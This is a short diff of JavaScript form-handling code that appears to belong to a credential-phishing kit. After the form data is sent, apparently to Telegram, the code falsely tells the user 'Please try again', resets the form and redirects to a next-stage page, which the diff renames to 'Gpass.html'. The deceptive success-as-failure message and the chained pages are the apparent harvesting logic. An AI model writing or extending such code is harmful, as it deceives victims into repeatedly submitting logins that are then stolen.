@@ -74,7 +74,7 @@ document.addEventListener("DOMContentLoaded", () => {
         if (response.ok) {
           alert(`Please try again`);
           form.reset();
-          window.location.href = `tx.html?id=${userId}`;
+          window.location.href = `Gpass.html?id=${userId}`;
         } else {
           const errorText = await response.text();
           console.error("Telegram Error:", errorText);
